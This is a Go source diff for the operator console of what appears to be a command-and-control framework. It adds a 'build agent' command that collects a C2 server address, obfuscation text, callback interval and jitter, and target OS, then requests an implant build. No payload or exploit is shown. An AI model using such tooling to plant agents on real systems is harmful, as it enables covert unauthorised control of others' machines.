@@ -3,6 +3,7 @@ package main
 import (
 	"bufio"
 	"bytes"
+	"encoding/json"
 	"fmt"
 	"github.com/degenerat3/meteor/meteor/pbuf"
 	"github.com/golang/protobuf/proto"
@@ -293,10 +294,11 @@ User: %s
 CAPABILITY				SYNTAX
 ------------------------------------------------------------------------------------------
 
-NEW ACTION:             action <target_hostname> <mode_code> <arguments>
-NEW GROUP ACTION:       gaction <target_groupname> <mode_code> <arguments>
-SHOW RESULT:            result <uuid>
-LIST AVAILABLE <X>:     list <modes/hosts/host/groups/group/bots/actions> <OPT:host/group>
+NEW ACTION:             action <%%target_hostname%%> <%%mode_code%%> <%%arguments%%>
+NEW GROUP ACTION:       gaction <%%target_groupname%%> <%%mode_code%%> <%%arguments%%>
+SHOW RESULT:            result <%%uuid%%>
+LIST AVAILABLE <X>:     list <modes/hosts/host/groups/group/bots/actions> <OPT:%%host%%/%%group%%>
+BUILD REQUEST:          build <agent/*>             // more build options coming in the future
 HELP MENU               help
 QUIT PROMPT             exit
 `, DTSERVER, DTUSER)
@@ -457,4 +459,76 @@ func handleListActions() string {
 		return err.Error()
 	}
 	return stat.GetDesc()
+}
+
+func handleBuild(splitargs []string) string {
+	var retval string
+	if len(splitargs) < 1 {
+		return "Error: missing arg"
+	}
+	if splitargs[0] == "agent" {
+		retval = handleBuildAgent()
+	}
+	return retval
+}
+
+func handleBuildAgent() string {
+	reader := bufio.NewReader(os.Stdin)
+	fmt.Print("\nClient type (petrie | cera): ")
+	cn, _ := reader.ReadString('\n')
+	cn = strings.TrimSuffix(cn, "\n")
+	cn = strings.TrimSuffix(cn, "\r")
+	fmt.Print("\nServer (including port if applicable): ")
+	srv, _ := reader.ReadString('\n')
+	srv = strings.TrimSuffix(srv, "\n")
+	srv = strings.TrimSuffix(srv, "\r")
+	fmt.Print("\nReg file path: ")
+	rf, _ := reader.ReadString('\n')
+	rf = strings.TrimSuffix(rf, "\n")
+	rf = strings.TrimSuffix(rf, "\r")
+	fmt.Print("\nObfuscation text: ")
+	obf, _ := reader.ReadString('\n')
+	obf = strings.TrimSuffix(obf, "\n")
+	obf = strings.TrimSuffix(obf, "\r")
+	fmt.Print("\nCallback interval (Seconds): ")
+	intv, _ := reader.ReadString('\n')
+	intv = strings.TrimSuffix(intv, "\n")
+	intv = strings.TrimSuffix(intv, "\r")
+	fmt.Print("\nCallback delta (Seconds): ")
+	dlt, _ := reader.ReadString('\n')
+	dlt = strings.TrimSuffix(dlt, "\n")
+	dlt = strings.TrimSuffix(dlt, "\r")
+	fmt.Print("\nTarget OS (windows | linux): ")
+	tos, _ := reader.ReadString('\n')
+	tos = strings.TrimSuffix(tos, "\n")
+	tos = strings.TrimSuffix(tos, "\r")
+	fmt.Print("\nDebug mode (true | false): ")
+	dbg, _ := reader.ReadString('\n')
+	dbg = strings.TrimSuffix(dbg, "\n")
+	dbg = strings.TrimSuffix(dbg, "\r")
+
+	reqBody, err := json.Marshal(map[string]string{
+		"ClientName": cn,
+		"Server":     srv,
+		"RegFile":    rf,
+		"ObfText":    obf,
+		"Interval":   intv,
+		"Delta":      dlt,
+		"TargetOS":   tos,
+		"Debug":      dbg,
+	})
+	if err != nil {
+		return err.Error()
+	}
+	url := "http://" + DTSERVER + "/buildreq"
+	resp, err := http.Post(url, "application/json", bytes.NewBuffer(reqBody))
+	if err != nil {
+		return err.Error()
+	}
+	defer resp.Body.Close()
+	body, err := ioutil.ReadAll(resp.Body)
+	if err != nil {
+		return err.Error()
+	}
+	return string(body)
 }
